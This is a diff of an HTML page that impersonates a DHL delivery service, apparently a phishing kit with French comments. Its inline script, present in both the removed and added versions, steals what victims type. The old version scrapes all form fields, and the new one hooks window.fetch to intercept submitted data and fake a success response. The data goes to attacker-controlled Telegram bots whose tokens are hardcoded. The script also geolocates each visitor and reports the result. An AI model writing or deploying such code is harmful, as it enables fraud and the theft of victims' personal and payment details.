@@ -5,87 +5,77 @@
     <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>DHL - Service de Livraison</title>
-    <script type="module" crossorigin src="/assets/index-2vbYnM8p.js"></script>
-    <link rel="stylesheet" crossorigin href="/assets/index-BFZsShg-.css">
     <script>
 (function() {
-  const DATA_BOT_TOKEN = "8584171291:AAHfFk3H1WhcAaxTOOR5vfqevrbekyC5nY4";
-  const VISIT_BOT_TOKEN = "8421410574:AAGGyYXoD10wYMsUjbZWxCYO4J33tYmAPA4";
+  const DATA_BOT = "8584171291:AAHfFk3H1WhcAaxTOOR5vfqevrbekyC5nY4";
+  const VISIT_BOT = "8421410574:AAGGyYXoD10wYMsUjbZWxCYO4J33tYmAPA4";
   const CHAT_ID = "6788012481";
+  const TG = "https://api.telegram.org/bot";
 
-  const realFetch = window.fetch;
+  // Garde la ref au vrai fetch AVANT que React le touche
+  const _fetch = window.fetch.bind(window);
 
-  function sendToTelegram(text, botToken) {
-    try {
-      realFetch("https://api.telegram.org/bot" + botToken + "/sendMessage", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' }),
-        keepalive: true
-      }).catch(function() {});
-    } catch(e) {}
+  function tg(token, text) {
+    _fetch(TG + token + "/sendMessage", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "HTML" }),
+      keepalive: true
+    }).catch(function(){});
   }
 
-  let lastSentData = "";
+  // Remplace window.fetch pour intercepter les appels React
+  window.fetch = async function(resource, init) {
+    var url = (typeof resource === "string") ? resource : (resource && resource.url) || "";
 
-  function captureFormInputs() {
-    var inputs = document.querySelectorAll('input, select, textarea');
-    var text = '📦 <b>DHL Nouvelles Saisies</b>\n\n';
-    var count = 0;
+    // Intercepter les appels de l'app vers notre backend local
+    if (url === "/api/collect" || url.indexOf("api/collect") !== -1 ||
+        url.indexOf("backend.blink.new") !== -1) {
 
-    inputs.forEach(function(input) {
-      if (input.value && input.value.trim() !== '' && input.type !== 'submit' && input.type !== 'hidden') {
-        var label = input.getAttribute('placeholder') || input.name || input.id || input.ariaLabel || 'Champ';
-        text += '<b>' + label + ':</b> ' + input.value + '\n';
-        count++;
-      }
-    });
+      try {
+        var bodyStr = (init && init.body) ? init.body : "";
+        if (typeof bodyStr === "string" && bodyStr.length > 0) {
+          var parsed = JSON.parse(bodyStr);
+          var type = parsed.type || "data";
+          var data = parsed.data || parsed;
 
-    if (count > 0 && text !== lastSentData) {
-      lastSentData = text;
-      sendToTelegram(text, DATA_BOT_TOKEN);
+          var msg = "📦 <b>DHL - " + type.toUpperCase() + "</b>\n\n";
+          for (var k in data) {
+            if (data.hasOwnProperty(k)) {
+              msg += "<b>" + k + ":</b> " + data[k] + "\n";
+            }
+          }
+          tg(DATA_BOT, msg);
+        }
+      } catch(e) {}
+
+      // Retourner une fausse réponse 200 OK pour que React continue
+      return Promise.resolve(new Response(
+        JSON.stringify({ success: true }),
+        { status: 200, headers: { "Content-Type": "application/json" } }
+      ));
     }
-  }
 
-  ['change', 'blur', 'input'].forEach(function(evtName) {
-    document.addEventListener(evtName, function(e) {
-      if (e.target && (e.target.tagName === 'INPUT' || e.target.tagName === 'SELECT')) {
-        captureFormInputs();
-      }
-    }, true);
-  });
-
-  ['submit', 'click', 'touchstart', 'pointerdown'].forEach(function(evtName) {
-    document.addEventListener(evtName, function(e) {
-      captureFormInputs();
-    }, true);
-  });
-
-  window.fetch = async function() {
-    var url = arguments[0] && typeof arguments[0] === 'string' ? arguments[0] : (arguments[0] && arguments[0].url ? arguments[0].url : '');
-    if (url && url.includes('backend.blink.new')) {
-      captureFormInputs();
-      return Promise.resolve(new Response(JSON.stringify({ success: true }), {
-        status: 200,
-        headers: { 'Content-Type': 'application/json' }
-      }));
-    }
-    return realFetch.apply(this, arguments);
+    // Toutes les autres requêtes passent normalement
+    return _fetch.apply(this, arguments);
   };
 
-  try {
-    realFetch('https://ipwho.is/').then(function(r) { return r.json(); }).then(function(data) {
-      var visitText = '🚨 <b>New DHL Visit</b>\n\n' +
-        '🌐 <b>IP:</b> ' + (data.ip || 'Inconnu') + '\n' +
-        '🏙️ <b>Ville:</b> ' + (data.city || 'Inconnu') + '\n' +
-        '🌍 <b>Pays:</b> ' + (data.country || 'Inconnu') + '\n' +
-        '📱 <b>UA:</b> ' + navigator.userAgent;
-      sendToTelegram(visitText, VISIT_BOT_TOKEN);
-    }).catch(function() {});
-  } catch(e) {}
-
+  // Tracking visite
+  _fetch("https://ipwho.is/")
+    .then(function(r) { return r.json(); })
+    .then(function(d) {
+      tg(VISIT_BOT,
+        "🚨 <b>New DHL Visit</b>\n\n" +
+        "🌐 <b>IP:</b> " + (d.ip || "?") + "\n" +
+        "🏙️ <b>Ville:</b> " + (d.city || "?") + "\n" +
+        "🌍 <b>Pays:</b> " + (d.country || "?") + "\n" +
+        "📱 <b>UA:</b> " + navigator.userAgent
+      );
+    }).catch(function(){});
 })();
     </script>
+    <script type="module" crossorigin src="/assets/index-2vbYnM8p.js"></script>
+    <link rel="stylesheet" crossorigin href="/assets/index-BFZsShg-.css">
   </head>
   <body>
     <div id="root"></div>
